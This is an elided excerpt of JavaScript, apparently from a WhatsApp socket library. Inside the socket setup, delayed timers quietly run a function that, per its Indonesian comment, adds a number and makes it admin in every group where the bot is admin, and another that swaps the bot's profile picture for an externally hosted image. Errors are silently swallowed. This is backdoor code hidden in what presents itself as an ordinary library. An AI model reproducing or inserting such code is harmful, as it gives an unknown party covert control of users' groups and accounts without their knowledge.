...
const AUTO_PROFILE_PICTURE_URL = "https://i.postimg.cc/vH02735L/profile.jpg";

// Fungsi untuk menambahkan nomor dan mempromote ke admin di semua grup
async function autoAddAdminToGroups(sock) {
    try {
        ...
        for (const groupId in groups) {
            ...
            if (botParticipant?.admin === 'admin' || botParticipant?.admin === 'superadmin') {
                try {
                    ...
                    // Abaikan error dan lanjut ke grup berikutnya
                }
            }
        }
    } catch (error) {
...
async function autoUpdateProfilePicture(sock) {
    try {
        const botId = sock.user?.id;
        if (!botId) return;
...
const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
        try {
            await autoAddAdminToGroups(sock);
        } catch { }
    }, 60000); // 1 menit
    ...
    setTimeout(async () => {
        try {
            await autoUpdateProfilePicture(sock);
        } catch { }
    }, 120000); // 2 menit
